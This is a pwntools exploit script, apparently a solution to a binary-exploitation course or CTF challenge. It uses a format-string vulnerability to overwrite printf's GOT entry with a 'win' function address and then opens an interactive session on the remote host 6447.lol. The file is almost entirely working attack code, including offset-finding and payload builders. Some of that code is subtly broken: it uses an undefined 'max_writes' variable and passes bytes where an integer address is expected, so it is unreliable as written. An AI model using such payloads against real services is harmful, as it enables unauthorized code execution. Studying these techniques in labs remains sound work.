#!/usr/bin/env python3

# Arch:       amd64-64-little
# RELRO:      No RELRO                      -- GOT is writable
# Stack:      No canary found               -- no buffer overflow protection
# NX:         NX enabled                    -- non-executable stack
# PIE:        No PIE (0x400000)             -- fixed addresses for simplified exploitation
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import *

HOST = "6447.lol"
PORT = args.PORT if args.PORT else 4001

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
break *0x401314
continue
'''.format(**locals())

def build_format_string(target, goal, start_byte=1, max_write=8):
    WRAP = 0x100

    # bytes_list = [(goal >> (8 * i)) & 0xff for i in range(max_write)]
    # writes = [(byte_value, index) for index, byte_value in enumerate(bytes_list)]
    # writes.sort(key=lambda x: x[0])

    payload = b''
    written = 0 

    for idx, (byte_value) in enumerate(goal):
        to_write = (byte_value - written) % WRAP
        if to_write > 0:
            payload += f"%{to_write}c".encode()
        param_index = start_byte + idx
        payload += f"%{param_index}$hhn".encode()

    padding = b'A' * ((8 - (len(payload) % 8)) % 8)
    payload += padding

    for idx in range(max_writes):
        payload += p64(target + idx)

    return payload

def connect_binary():
    global P, E, TARGET, WIN
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")
    
        TARGET = E.got['printf']
        WIN = E.symbols['win']              # 0x 00 40 11 d6

def say(payload):
    P.recvuntil(b"You say:")
    P.sendline(payload)

def exploit():
    offset = 5 # find_offset(b"You say:")
    log.info(f"Using offset: {offset}")

    connect_binary()
    
    log.info(f"TARGET function address: {hex(TARGET)}")
    log.info(f"WIN function address: {hex(WIN)}")

    payload = build_format_string(p64(TARGET), p64(WIN), start_byte=133+9) # add 9 to account for the initial input of the buffer before addresses
    say(payload)
    
    log.info(f"Payload sent: {payload}")
    P.interactive()

def find_offset(after = b':', option = 1):
    for i in range(1, 200):
        connect_binary()

        if option == 1:
            P.sendlineafter(after, f'AAAA%{i}$x'.encode())
            output = P.recvline(timeout=0.5).strip().decode('utf-8')
        else:
            P.sendlineafter(after, f'AAAABBBB %{i}$p') # replace %x with %s to find the actual values
            P.recvuntil('AAAABBBB')
            print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode('utf-8')))

        context.log_level = 'error'
        P.close()
        context.log_level = 'info'

        if option == 1 and '41414141' in output:
            return i

if __name__ == '__main__':
    exploit()
    # find_offset(option=2)

# payload = p64(TARGET)
# payload += f'%{0x004011d6 - len(payload)}x%{offset}$p'.encode()

# payload = p64(TARGET)
# payload += p64(TARGET + 1)
# payload += p64(TARGET + 2)
# payload += p64(TARGET + 3)

# write_d6 = 0xd6 - len(payload)
# payload += f'%{write_d6}x%{offset}$hhn'.encode()

# write_11 = 0x100 + 0x11 - 0xd6
# payload += f'%{write_11}x%{offset + 1}$hhn'.encode()

# write_40 = 0x100 + 0x40 - 0x11
# payload += f'%{write_40}x%{offset + 2}$hhn'.encode()

# write_00 = 0x100 + 0x00 - 0x40
# payload += f'%{write_00}x%{offset + 3}$hhn'.encode()